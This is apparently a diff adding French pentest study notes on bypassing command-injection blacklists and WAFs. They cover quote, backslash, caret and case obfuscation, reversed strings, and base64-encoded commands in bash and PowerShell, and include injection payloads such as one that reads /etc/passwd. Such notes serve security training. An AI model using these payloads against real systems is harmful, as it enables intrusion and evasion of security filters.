@@ -255,4 +255,119 @@ Lister toutes les variables dispo :
 
 ---
 
+# Bypassing Blacklisted Commands
+
+## Contexte
+- Certaines applis bloquent des **mots-clés** (`whoami`, `cat`, etc.) → **command blacklist**.  
+- Objectif : **obfusquer** nos commandes pour contourner la détection.  
+- Astuce : les shells (bash, PowerShell, CMD) ignorent certains caractères insérés dans un mot.
+
+## Exemple de filtre côté serveur (PHP)
+`$blacklist = ['whoami', 'cat', ...];  
+foreach ($blacklist as $word) {  
+&nbsp;&nbsp;&nbsp;&nbsp;if (strpos($_POST['ip'], $word) !== false) {  
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "Invalid input";  
+&nbsp;&nbsp;&nbsp;&nbsp;}  
+}`
+
+➡️ Vérifie correspondance exacte du mot → obfuscation = bypass possible.
+
+## Techniques d’obfuscation
+
+### 1. Quotes (Linux & Windows)
+- Insertion de `'` ou `"` au milieu des caractères.  
+- ⚠️ Ne pas mélanger les deux types, et nombre de quotes doit être pair.  
+
+Exemples :  
+- `w'h'o'am'i` → `whoami`  
+- `w"h"o"am"i` → `whoami`  
+
+Payload :  
+`127.0.0.1%0aw'h'o'am'i`
+
+### 2. Linux-only
+- Caractères tolérés par **bash** :  
+  - `\` (backslash)  
+  - `$@` (paramètres positionnels)  
+
+Exemples :  
+- `who$@ami` → `whoami`  
+- `w\ho\am\i` → `whoami`
+
+### 3. Windows-only
+- Caractère **caret** `^` → ignoré par CMD.  
+
+Exemple :  
+- `who^ami` → `whoami`
+
+- Si un caractère utilisé (`'`, `"`, `\`, `^`, `$@`) est blacklisté → combiner avec les méthodes vues pour **caractères interdits** (`${VAR:x:y}`, `$IFS`, `%09`, etc.).  
+
+---
+
+# Advanced Command Obfuscation
+
+## Objectif
+- Contourner les **WAFs** et filtres avancés.  
+- Utiliser des techniques d’**obfuscation** pour changer l’apparence des commandes sans en briser l’exécution.  
+
+## 1. Case Manipulation
+
+### Windows (case-insensitive)
+- `WhOaMi` → fonctionne comme `whoami`.
+
+### Linux (case-sensitive)
+- Transformer en minuscules avec `tr`:  
+  `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` → `whoami`  
+- Alternative sans espaces :  
+  `$(a="WhOaMi";printf %s "${a,,}")`
+
+⚠️ Attention aux espaces → remplacer par `%09` (tab).
+
+## 2. Reversed Commands
+
+### Linux
+- Obtenir chaîne inversée :  
+  `echo 'whoami' | rev` → `imaohw`  
+- Exécuter en inversant à la volée :  
+  `$(rev<<<'imaohw')` → `whoami`
+
+### Windows (PowerShell)
+- Inverser chaîne :  
+  `"whoami"[-1..-20] -join ''` → `imaohw`  
+- Exécuter via sub-shell :  
+  `iex "$('imaohw'[-1..-20] -join '')"`
+
+## 3. Encoded Commands
+
+### Linux — Base64
+- Encoder :  
+  `echo -n 'cat /etc/passwd | grep 33' | base64`  
+  → `Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==`
+
+- Exécuter :  
+  `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
+
+⚠️ Utilisation de `<<<` pour éviter le `|` filtré.
+
+### Windows — Base64
+- Encoder :  
+  `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`  
+  → `dwBoAG8AYQBtAGkA`
+
+- Exécuter :  
+  `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
+
+
+## Notes pratiques
+- **Case manipulation** : simple, mais attention aux filtres.  
+- **Reversed commands** : ne contient jamais la commande originale en clair.  
+- **Encoded commands** : idéal quand des caractères sensibles sont filtrés.  
+- Alternatives si `bash` ou `base64` sont filtrés :  
+  - `sh` au lieu de `bash`  
+  - `openssl` ou `xxd` pour décodage  
+
+## Ressources
+- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)  
+
+---
 
